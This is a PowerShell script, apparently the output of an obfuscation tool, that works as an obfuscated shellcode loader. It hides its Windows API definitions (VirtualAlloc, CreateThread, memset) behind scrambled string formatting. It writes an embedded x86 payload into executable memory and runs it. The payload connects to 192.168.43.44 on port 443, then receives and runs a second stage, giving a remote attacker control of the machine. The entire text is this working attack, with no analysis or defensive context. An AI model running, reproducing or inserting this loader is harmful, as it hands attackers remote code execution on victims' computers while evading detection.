# Obfuscating 2 String tokens

$c = ((("{93}{18}{80}{55}{54}{102}{68}{22}{92}{19}{56}{15}{65}{13}{106}{81}{74}{10}{36}{9}{73}{113}{50}{72}{83}{24}{16}{25}{78}{11}{62}{2}{114}{108}{3}{70}{31}{98}{76}{44}{0}{20}{84}{61}{59}{104}{71}{85}{64}{12}{79}{7}{26}{28}{87}{47}{48}{110}{30}{101}{35}{94}{99}{8}{95}{40}{115}{89}{75}{37}{45}{107}{52}{112}{39}{46}{34}{49}{17}{58}{42}{27}{4}{1}{51}{96}{23}{38}{97}{105}{21}{103}{32}{6}{63}{69}{60}{86}{82}{66}{5}{41}{14}{91}{67}{77}{33}{90}{109}{111}{29}{88}{43}{53}{100}{57}"-f'l32.d',', ui',' f',';[D','r','blic ','[DllImport(','r','tackS','l','Pt','llocatio','P','r','xt','IntP',' dwSize, uin','P','ort',' ext','ll7','ad','blic stati','wCreationFlags, Int','t','t','e','ete','ad','nt s','t','Im',');','(IntPt','Ptr','s','r ','t','Pt',', In',',','static e','am',' ui','e','ar','t','lpThre','adAt',' lp',',','n','res','nt co','el3','ern','ern ',';','ar','ic ex','m','stat','nType, uint','7','t','tr Vi','crt.dll7Qb)]pu','ntPtr mem','u','Qb','ll','ern I',' u','pAdd','lAlloc(Int','S','rn','set',' flA','tr CreateTh','(7Qbk','a','v','in','Qb)]public ','n','s','(IntPtr ','rc,','Ptr lp','r dest','ern I','c','[DllImp',', uint','ize','t d','r ','port(7Qbke',' dwS','unt)','e','2.dll7Qb)]p','Id','t','lpThre','tu','tAdd','ct)',', u','tribu','i','s','ress','lProte',' Int'))-replAcE([char]55+[char]81+[char]98),[char]34);$w = Add-Type -memberDefinition $c -Name ("{1}{0}"-f 'in32','W') -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x2b,0x2c,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};